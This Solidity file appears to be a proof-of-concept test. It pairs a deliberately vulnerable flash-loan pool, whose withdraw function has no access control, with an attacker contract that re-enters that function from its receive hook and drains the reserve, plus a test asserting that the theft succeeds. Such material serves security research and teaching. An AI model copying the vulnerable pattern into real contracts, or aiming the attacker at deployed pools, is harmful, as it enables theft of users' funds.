// SPDX-License-Identifier: MIT
pragma solidity 0.8.25;

contract CallbackFlashLoan {
    uint256 public reserve;

    function seed() external payable {
        reserve += msg.value;
    }

    function flashLoan(uint256 amount) external {
        require(amount <= reserve, "insufficient");
        reserve -= amount;
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "callback failed");
        reserve += amount;
    }

    function withdraw() external {
        uint256 amount = reserve;
        reserve = 0;
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "withdraw failed");
    }

    receive() external payable {}
}

contract FlashLoanAttacker {
    CallbackFlashLoan public pool;

    constructor(CallbackFlashLoan target) {
        pool = target;
    }

    function attack() external {
        pool.flashLoan(0);
    }

    receive() external payable {
        if (address(pool).balance > 0) {
            pool.withdraw();
        }
    }
}

contract CallbackFlashLoanPoC {
    function testPoC_CallbackReentersWithdraw() external {
        CallbackFlashLoan pool = new CallbackFlashLoan();
        FlashLoanAttacker attacker = new FlashLoanAttacker(pool);
        (bool seeded, ) = address(pool).call{value: 2}(
            abi.encodeWithSignature("seed()")
        );
        require(seeded, "pool seed failed");
        attacker.attack();
        require(address(pool).balance == 0, "reserve was not drained");
        require(address(attacker).balance == 2, "attacker did not receive reserve");
    }
}
